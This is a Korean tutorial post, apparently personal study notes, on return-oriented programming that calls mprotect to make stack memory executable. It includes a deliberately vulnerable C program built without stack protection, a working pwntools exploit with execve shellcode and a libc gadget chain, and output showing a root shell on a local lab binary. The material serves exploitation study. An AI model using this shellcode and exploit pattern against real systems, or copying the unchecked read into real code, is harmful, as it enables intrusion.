---
title: Return-Oriented Programming with mprotect
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-oriented programming]
math: true
mermaid: true
---

## Description

ROP를 통해 메모리 영역 할당(mmap)하거나 할당된 메모리 영역의 권한을 변경(mprotect)하여 공격하는 방법이다.

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o rop rop.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
   
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 256);
}
  
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

"A"*72 입력 시 overflow 발생한다.

```
gdb-peda$ x/24gx $rsp
0x7fffffffe450: 0x4141414141414141  0x000000000040070a
```

mprotect() 함수를 이용하여 shellcode가 저장된 메모리 영역의 권한을 rwx로 변경 -> address 값은 페이지 경계에 맞게 정렬되어 있어야 한다.

mprotect(address of shellcode,0x2000,0x7)

### Exploit code

```python
# Exploit Code
import sys
from pwn import *

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

binary = ELF('./rop')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
p = process('./rop')
#gdb.attach(p)
p.recvline()

printf_addr = int(p.recvline().split(' ')[3],16)
buf_addr = int(p.recvline().split(' ')[3],16)
libBase = printf_addr - 0x55800
mprotect_addr = libBase + libc.symbols['mprotect']
pop_rdi_ret = libBase + 0x00141997
pop_rdx_pop_rsi_ret = libBase + 0x001150c9

shell_area = int(str(hex(buf_addr))[0:11]+'000',16)

print('printf_addr: '+str(hex(printf_addr)))
print('buf_addr: '+str(hex(buf_addr)))
print('shell_area: '+str(hex(shell_area)))

payload = shellcode
payload += "A"*(72-len(shellcode))
# mprotect(shellArea,0x2000,0x7)
payload += p64(pop_rdi_ret)
payload += p64(shell_area)
payload += p64(pop_rdx_pop_rsi_ret)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(mprotect_addr)
payload += p64(buf_addr)

#raw_input('1')
p.sendline(payload)
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/test# python exploit.py 
[*] '/root/test/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './rop': pid 3650
printf_addr: 0x7f52d5ce1800
buf_addr: 0x7ffef5aa0f20
shell_area: 0x7ffef5aa0000
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

### Refereces
- [03.ROP(Return Oriented Programming) - mmap, mprotect](https://www.lazenca.net/display/TEC/03.ROP%28Return+Oriented+Programming%29+-+mmap%2C+mprotect)